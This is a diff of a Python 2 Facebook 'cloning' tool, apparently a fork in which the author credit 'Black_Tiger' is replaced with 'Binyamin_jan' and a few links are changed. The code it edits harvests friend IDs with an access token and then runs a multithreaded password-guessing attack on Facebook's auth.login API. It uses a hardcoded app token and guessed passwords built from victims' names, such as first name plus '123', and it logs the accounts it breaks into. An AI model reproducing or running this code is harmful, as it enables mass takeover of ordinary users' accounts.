@@ -249,7 +249,7 @@ def pilih_login():
 	        os.system('xdg-open https://m.apkpure.com/get-access-token/com.proit.thaison.getaccesstokenfacebook/download/1-APK?from=versions%2Fversion')
 	        login()
         elif peak =="4":
-	        os.system('xdg-open https://www.youtube.com/channel/UCZgglszllvTPgtyiKddsU3w')
+	        os.system('xdg-open https://youtu.be/5CHTnjNAiqM')
 	        login()
         elif peak =="5":
 	        os.system('xdg-open https://www.t.me/binyamin001')
@@ -389,7 +389,7 @@ def pilih():
                 jalan('\033[1;96m========80%')
                 jalan('\033[1;95m=========90%')
                 jalan('\033[1;94m==========100%')
-                jalan('\033[1;93mCloning Data Reset and update by Black_Tiger')
+                jalan('\033[1;93mCloning Data Reset and update by Binyamin_jan')
 		os.system('git pull origin master')
 		raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
 	        menu()		
@@ -464,16 +464,16 @@ def pilih_super():
 		pilih_super()
 	elif peak =="1":
 		os.system('clear')
-		print "\033[1;97m•-----------------\033[1;37mBlack_Tiger\033[1;97m-----------------•"
+		print "\033[1;97m•-----------------\033[1;37mBinyamin_jan\033[1;97m-----------------•"
 		print logo
-		jalan('\033[1;97m[+]\033[1;91mBlackTiger█████████████████▒▒▒▒▒▒▒▒..99%\033[1;97m:-:')
+		jalan('\033[1;97m[+]\033[1;91mBinyamin_jan█████████████████▒▒▒▒▒▒▒▒..99%\033[1;97m:-:')
 		r = requests.get("https://graph.facebook.com/me/friends?access_token="+toket)
 		z = json.loads(r.text)
 		for s in z['data']:
 			id.append(s['id'])
 	elif peak =="2":
 		os.system('clear')
-		print "\033[1;97m•-----------------\033[1;37mBlack_Tiger\033[1;97m-----------------•"
+		print "\033[1;97m•-----------------\033[1;37mBinyamin_jan\033[1;97m-----------------•"
 		print logo
 		idt = raw_input("\033[1;97m[+]\033[1;91mEnter ID\033[1;97m: \033[1;97m")
 		try:
@@ -484,7 +484,7 @@ def pilih_super():
 			print"\033[1;97m[+]\x1b[1;91mID Not Found!"
 			raw_input("\n\033[1;96m[\033[1;97mBack\033[1;96m]")
 			super()
-		print"\033[1;97m[+]\033[1;91mBlackTiger█████████████████▒▒▒▒▒▒▒▒..99%\033[1;97m:-:"
+		print"\033[1;97m[+]\033[1;91mBinyamin_Jan█████████████████▒▒▒▒▒▒▒▒..99%\033[1;97m:-:"
 		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
 		z = json.loads(r.text)
 		for i in z['data']:
@@ -500,7 +500,7 @@ def pilih_super():
 	for o in titik:
 		print("\r\033[1;97m[+]\033[1;31mHacking Has Been Started\033[1;97m"+o),;sys.stdout.flush();time.sleep(0.05)
 	print "\n\033[1;97m[+]\x1b[1;31mStop Process Press CTRL+Z"
-	print "\033[1;97m•-----------------\033[1;37mBlack_Tiger\033[1;97m-----------------•"
+	print "\033[1;97m•-----------------\033[1;37mBinyamin_jan\033[1;97m-----------------•"
  	
 			
 	def main(arg):
@@ -509,11 +509,11 @@ def pilih_super():
 		try:
 			os.mkdir('out')
 		except OSError:
-			pass #Dev:BlackTiger-Error404
+			pass #Dev:Binyamin
 		try:													
 			a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)												
 			b = json.loads(a.text)												
-			pass1 = b['first_name'] + '1234'												
+			pass1 = b['first_name'] + '123'												
 			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")												
 			q = json.load(data)												
 			if 'access_token' in q:
@@ -535,7 +535,7 @@ def pilih_super():
 				    cek.close()
 				    cekpoint.append(user+pass1)
                                 else:
-				    pass2 = b['first_name'] + '123'										
+				    pass2 = b['first_name'] + '1234'										
                                     data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")												
 			            q = json.load(data)												
 			            if 'access_token' in q:	
@@ -623,7 +623,7 @@ def pilih_super():
 				                                                   cek.close()
 				                                                   cekpoint.append(user+pass5)					
 						                               else:								
-							                           pass6 = 'Pakistan'											
+							                           pass6 = '100200'											
 			                                                           data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")												
 			                                                           q = json.load(data)												
 			                                                           if 'access_token' in q:	
@@ -667,7 +667,7 @@ def pilih_super():
 				                                                                           cek.close()
 				                                                                           cekpoint.append(user+pass7)           					
 								                                       else:						
-										                           pass8 = '000786'									
+										                           pass8 = b['last_name'] + '786'							
 			                                                                                   data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass8)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")												
 			                                                                                   q = json.load(data)												
 			                                                                                   if 'access_token' in q:		
@@ -717,11 +717,11 @@ def pilih_super():
 		
 	p = ThreadPool(30)
 	p.map(main, id)
-#Dev:BlackTiger-Error404
-        print "\033[1;97m•-----------------\033[1;37mBlack_Tiger\033[1;97m-----------------•"
+#Dev:Binyamin
+        print "\033[1;97m•-----------------\033[1;37mBinyamin_jan\033[1;97m-----------------•"
 	print '\033[1;97m[+]\033[1;47m \033[1;31mProcess Has Been Completed\033[1;0m'
 	print"\033[1;97m[+]\033[1;97mTotal \033[1;97mOK/\x1b[1;97mCP \033[1;97m: \033[1;97m"+str(len(oks))+"\033[1;97m/\033[1;97m"+str(len(cekpoint))
-	print "\033[1;97m«-----------------\033[1;37mBlack_Tiger\033[1;97m-----------------»"
+	print "\033[1;97m«-----------------\033[1;37mBinyamin_jan\033[1;97m-----------------»"
 	print """
  \033[1;97m
 \033[1;97m ██████╗  ██████╗  █████╗     ██╗     ██╗   ██╗ ██████╗██╗  ██╗
@@ -738,7 +738,7 @@ def pilih_super():
 \033[1;95m╚██████╔╝██████╔╝╚██████╔╝██████╔╝   ██║  ██████╔╝██████╔╝███████║ ██║ ██║     ██║
 \033[1;96m ╚═════╝ ╚═════╝  ╚═════╝ ╚═════╝    ╚═╝  ╚═════╝ ╚═════╝ ╚══════╝ ╚═╝ ╚═╝     ╚═╝      
 """
-	print "\033[1;97m«-----------------\033[1;37mBlack_Tiger\033[1;97m-----------------»"
+	print "\033[1;97m«-----------------\033[1;37mBinyamin_jan\033[1;97m-----------------»"
 	raw_input("\n\033[1;97m[+]\033[1;97mBack")
 	menu()
 
